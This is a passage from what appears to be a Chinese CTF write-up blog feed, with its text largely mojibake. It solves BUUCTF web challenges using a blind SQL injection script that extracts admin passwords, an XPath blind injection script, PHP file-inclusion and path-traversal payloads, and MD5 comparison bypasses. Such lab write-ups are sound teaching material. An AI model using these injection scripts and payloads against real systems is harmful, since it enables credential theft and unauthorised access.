class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0b5ee7e6-71d1-4280-9dd3-6e27f0650b68.node3.buuoj.cn/backend/content_detail.php?id=&quot;</span></span><br><span class="line">proxies = &#123; <span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = head + tail &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = &quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,3,2)&quot; % (i, mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;contents&#x27;)),%d,1))&gt;%d,3,2)&quot; % (i, mid)</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(group_concat(password))from(admin)),%d,1))&gt;%d,3,2)&quot;</span> % (i, mid)</span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload, proxies=proxies)</span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="comment"># print(r.json())</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Yunen&quot;</span> <span class="keyword">in</span> str(r.json()):</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        name += chr(head)</span><br><span class="line">        print(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="NPUCTF2020-ezlogin">NPUCTF2020 ezlogin</h2><h3 id="è€ƒç‚¹-v21">è€ƒç‚¹</h3><ul><li><a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">Xpathæ³¨å…¥</a></li></ul><h3 id="è§£é¢˜-v19">è§£é¢˜</h3><table><thead><tr><th>payload</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>â€™ or count(/)=1 or '1</td><td>åˆ¤æ–­æœ‰å‡ ä¸ªæ ¹èŠ‚ç‚¹</td></tr><tr><td>â€™ or string-count(name(/*[1]))=1 or '1</td><td>è·å–æ ¹èŠ‚ç‚¹é•¿åº¦</td></tr><tr><td>'or substring(name(/*[1]), 1, 1)=â€˜aâ€™ or '1</td><td>è·å–å†…å®¹</td></tr></tbody></table><p>ç›²æ³¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://90cceea4-fbed-4c2b-97de-a43474dea042.node3.buuoj.cn/login.php&#x27;</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">strs = string.digits + string.ascii_letters</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">find = re.compile(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        r = sess.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> token:</span><br><span class="line">            <span class="comment"># æ ¹èŠ‚ç‚¹root</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i, j, token[0])</span></span><br><span class="line">            <span class="comment"># rootå­èŠ‚ç‚¹accounts</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># accountså­èŠ‚ç‚¹user</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># userå­èŠ‚ç‚¹id, username, password</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            data = <span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.format(</span><br><span class="line">                i, j, token[<span class="number">0</span>])</span><br><span class="line">            res = sess.get(url=url, headers=headers, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;éæ³•æ“ä½œ&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                result += j</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æœ€åå¯ä»¥åˆ¤æ–­æ ¼å¼ä¸ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">accounts</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>gtfly123<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>e10adc3949ba59abbe56e057f20f883e<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>adm1n<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>cf7414b5bdb2e65ee43083f4ddbc4d9f<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>passwordæ— æ³•è§£å¯†ï¼Œä½¿ç”¨<code>adm1n gtfly123</code>ç™»å½•ç«™ç‚¹ã€‚</p><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæç¤ºï¼š<code>flag is in /flag</code></p><p>å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨å¤§å°å†™ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin.php?file&#x3D;PHP:&#x2F;&#x2F;filter&#x2F;convert.BASE64-encode&#x2F;resource&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="SUCTF2018-MultiSQL">SUCTF2018 MultiSQL</h2><h2 id="PwnThyBytes2019-bBaby-SQL">PwnThyBytes2019 bBaby_SQL</h2><h2 id="October-2019-Twice-SQL-Injection">October 2019 Twice SQL Injection</h2><h2 id="HITCON-2017-SQL-So-Hard">HITCON 2017 SQL So Hard</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å¼ºç½‘æ¯-2019-éšä¾¿æ³¨&quot;&gt;å¼ºç½‘æ¯ 2019 éšä¾¿æ³¨&lt;/h2&gt;
&lt;h3 id=&quot;è€ƒç‚¹&quot;&gt;è€ƒç‚¹&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;å †å æ³¨å…¥&lt;/li&gt;
&lt;li&gt;é¢„ç¼–è¯‘è¯­å¥&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;è§£é¢˜&quot;&gt;è§£é¢˜&lt;/h3&gt;
&lt;h4 id=&quot;æ–¹æ³•ä¸€&quot;&gt;æ–¹æ³•ä¸€&lt;/h4
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="SQLæ³¨å…¥" scheme="http://ca0y1h.top/categories/CTF/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”PHPä»£ç å®¡è®¡</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2020-08-18T09:57:57.000Z</published>
    <updated>2020-08-18T12:29:13.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTFåˆ·é¢˜â€”â€”PHPä»£ç å®¡è®¡">BUUCTFåˆ·é¢˜â€”â€”PHPä»£ç å®¡è®¡</h1><h2 id="HCTF2018-WarmingUp">[HCTF2018]WarmingUp</h2><h3 id="è€ƒç‚¹">è€ƒç‚¹</h3><ul><li>ä»£ç å®¡è®¡</li></ul><h3 id="è§£é¢˜">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.cnblogs.com/h3zh1/p/12853478.html">https://www.cnblogs.com/h3zh1/p/12853478.html</a></p></blockquote><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f3a0386f-ebf6-4b35-8a60-87de301e158a.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>æˆ‘æ„Ÿè§‰ä¸Šé¢è¿™ä¸ªåˆ†ææœ‰ç‚¹é—®é¢˜ï¼Œè¿™ä¸ªpayloadåˆ°äº†ç¬¬23è¡Œçš„ifè¯­å¥å°±ç›´æ¥returnï¼Œæ²¡æœ‰åé¢çš„ä»£ç å•¥äº‹äº†ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619203925.png" alt=""></p><h2 id="æå®¢å¤§æŒ‘æˆ˜2019-PHP">[æå®¢å¤§æŒ‘æˆ˜2019]PHP</h2><h3 id="TODO">TODO</h3><h2 id="BJDCTF2020-Easy-MD5">BJDCTF2020 Easy MD5</h2><h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3><ul><li>PHP MD5</li></ul><h3 id="è§£é¢˜-v2">è§£é¢˜</h3><h4 id="ç¬¬ä¸€å…³">ç¬¬ä¸€å…³</h4><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620161827.png" alt=""></p><p>payloadï¼š<code>ffifdyop</code></p><blockquote><p>åˆ†ææ–‡ç« ï¼š<a href="https://blog.csdn.net/March97/article/details/81222922?utm_source=blogxgwz9">https://blog.csdn.net/March97/article/details/81222922?utm_source=blogxgwz9</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1  ï¼Œä¹Ÿå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚å½“ç„¶åœ¨æˆ‘åæ¥æµ‹è¯•ä¸­å‘ç°ï¼Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚</p></blockquote><h4 id="ç¬¬äºŒå…³">ç¬¬äºŒå…³</h4><p>MD5 ç¢°æ’</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620163106.png" alt=""></p><h4 id="ç¬¬ä¸‰å…³">ç¬¬ä¸‰å…³</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºMD5å¼ºç±»å‹æ¯”è¾ƒï¼Œè¿™æ—¶å€™ä¼ å…¥ä¸¤ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„å€¼ä¸ç›¸ç­‰ï¼Œé€ æˆMD5åŠ å¯†æ—¶æŠ¥é”™äº§ç”ŸNULL=NULLçš„æƒ…å†µï¼Œç»•è¿‡æ¯”è¾ƒã€‚</p><h3 id="æ‹“å±•">æ‹“å±•</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;param1&#x27;</span>]!==(<span class="keyword">string</span>)$_POST[<span class="string">&#x27;param2&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/2232">https://xz.aliyun.com/t/2232</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;param2&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-Ez-bypass">MRCTF2020 Ez_bypass</h2><h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3><ul><li>MD5ç»•è¿‡</li><li>is_numericç»•è¿‡</li></ul><h3 id="è§£é¢˜-v3">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒç®€å•çš„ä¸€é“é¢˜ã€‚</p><p>ç¬¬ä¸€ä¸ªä¸ºMD5å¼ºç±»å‹æ¯”è¾ƒï¼Œè¿™æ—¶å€™ä¼ 